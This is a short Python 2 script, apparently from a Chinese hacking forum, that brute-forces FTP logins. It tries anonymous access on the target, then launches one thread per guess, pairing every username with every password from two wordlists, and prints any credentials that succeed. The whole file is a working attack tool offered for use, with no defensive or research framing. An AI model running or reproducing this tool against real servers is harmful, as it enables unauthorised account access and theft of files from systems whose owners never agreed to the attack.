#!/usr/bin/env python
# -*- coding: gbk -*-
# -*- coding: utf_8 -*-
# Date: 2014/10/2
from threading import Thread
import ftplib, socket
import sys, time, re

print '''
    #######################################################
    #                                                     #
    #               FTP爆破工具V1.0—Python版             #
    #             BBS：http://www.nkers.net/              #
    #                 Code BY：Evilys                     #
    #                                                     #
    #######################################################
'''

def usage():

    if len(sys.argv) != 4:
        
        sys.exit()


def brute_anony():
    try:
        print '[+] 测试匿名登陆……\n'
        ftp = ftplib.FTP()
        ftp.connect(host, 21, timeout=10)
        print 'FTP返回消息: %s \n' % ftp.getwelcome()
        ftp.login()
        ftp.retrlines('LIST')
        ftp.quit()
        print '\n[+] 匿名登陆成功……O(∩_∩)O~\n'
    except ftplib.all_errors:
        print '\n[-] 匿名登陆失败……~~~~(>_<)~~~~ \n'


def brute_users(user, pwd):
    try:
        ftp = ftplib.FTP()
        ftp.connect(host, 21, timeout=10)
        ftp.login(user, pwd)
        ftp.retrlines('LIST')
        ftp.quit()
        print '\n[+] Success [+] UserName：%s [+] PassWord：%s\n' % (user, pwd)
    except ftplib.all_errors:
        pass


if __name__ == '__main__':
    usage()
    start_time = time.time()
    if re.match(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', sys.argv[1]):
        host = sys.argv[1]
    else:
        host = socket.gethostbyname(sys.argv[1])
    userlist = [i.rstrip() for i in open(sys.argv[2])]
    passlist = [j.rstrip() for j in open(sys.argv[3])]
    print ' TarGet：%s \n' % sys.argv[1]
    print ' UserName：%d 条\n' % len(userlist)
    print ' PassWord：%d 条\n' % len(passlist)
    brute_anony()
    print '\n[+] 暴力爆菊中……╭(╯3╰)╮\n'
    thrdlist = []
    for user in userlist:
        for pwd in passlist:
            t = Thread(target=brute_users, args=(user, pwd))
            t.start()
            thrdlist.append(t)
            time.sleep(0.009)
    for x in thrdlist:
        x.join()
    print '[+] 爆菊完成，用时： %d 秒(～ o ～)~zZ' % (time.time() - start_time)
	

